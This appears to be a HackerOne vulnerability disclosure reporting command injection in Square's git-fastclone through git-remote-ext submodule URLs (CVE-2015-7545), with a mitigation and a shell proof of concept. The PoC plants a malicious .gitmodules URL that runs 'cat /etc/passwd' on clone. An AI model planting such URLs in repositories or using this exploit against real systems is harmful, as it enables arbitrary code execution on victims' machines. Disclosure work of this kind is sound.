@@ -1,0 +1,65 @@
+ReportLink:https://hackerone.com/reports/104465
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/bburky
+ReportedTo:Square Open Source(square-open-source)
+BountyAmount:2000.0
+Severity:
+State:Closed
+DateOfDisclosure:25.01.2016 18:41:17
+
+Summary:
+
+I recently discovered a security vulnerability in git that also affects other programs that manually reimplement submodule-like operations. The recent security update to git[0] concerning git-remote-ext URLs in submodules affects git-fastclone similarly. This bug was patched in Git v2.6.1, v2.5.4, v2.4.10 and v2.3.10. The issue in git was just assigned CVE-2015-7545 [2]. Google's git-repo command was affected very similarly[3] to git-fastclone and it was recently patched too.
+
+The git team's description of the bug was: 
+> Some protocols (like git-remote-ext) can execute arbitrary code 
+> found in the URL. The URLs that submodules use may come from 
+> arbitrary sources (e.g., .gitmodules files in a remote 
+> repository), and can hurt those who blindly enable recursive 
+> fetch. Restrict the allowed protocols to well known and safe 
+> ones.
+
+Some more discussion of the vulnerability can be found in this commit message: 
+https://github.com/git/git/commit/33cfccbbf35a56e190b79bdec5c85457c952a021
+
+Basically, the git-remote-ext remote helper (which supports "ext::ssh example.com %S foo/repo" URLs) allows arbitrary command execution. This normally isn't ever a concern because user always sees and trusts the URL they pass to git. However git submodules, through the .gitmodules file, allow an attacker to request the client to fetch arbitrary git URLs.
+
+Because git-fastclone reimplements fetching submodules, you cannot take advantage of the recent fix to git. Even if the user's git is patched and up to date, git-fastclone is vulnerable.
+
+To mitigate this, git now supports a GIT_ALLOW_PROTOCOL environment variable to whitelist the allowed protocols for all git operations. See the 33cfccb commit above for an example. You could set this to the same whitelist that git-submodule now uses.
+
+[1] https://lkml.org/lkml/2015/10/5/683
+[2] https://access.redhat.com/security/cve/cve-2015-7545
+[3] https://code.google.com/p/git-repo/issues/detail?id=210
+
+
+
+The following commands should demonstrate the vulnerability. This repository should trigger the vulnerability on any *nix system and will cat /etc/passwd to the screen during `git fastclone ...`
+
+
+    git init malicious-ext-submodule
+    cd malicious-ext-submodule
+    
+    # This can be the URL of any valid git repository
+    # This is just used to initially create the submodule in the repo
+    git submodule add https://github.com/octocat/Hello-World malicious-submodule
+    
+    # Then rewrite the .gitmodules file to the malicious ext:: url
+    cat >.gitmodules <<"EOF"
+    [submodule "malicious-submodule"]
+        path = malicious-submodule
+        url = "ext::sh -c cat% /etc/passwd% >&2"
+    EOF
+    git add .gitmodules
+    git commit -m 'Malicious git-remote-ext submodule'
+    cd ..
+    
+    # Now clone the repository locally
+    # This works just as well if cloning from a network-based git repository as well
+    git fastclone malicious-ext-submodule malicious-ext-submodule-clone
+    
+    # Observe demonstration of command execution by printing /etc/password to stderr
+    
+    
+    # If you are running a patched version of git (e.g. v2.6.1), this command should not trigger the exploit:
+    git clone --recursive malicious-ext-submodule malicious-ext-submodule-clone
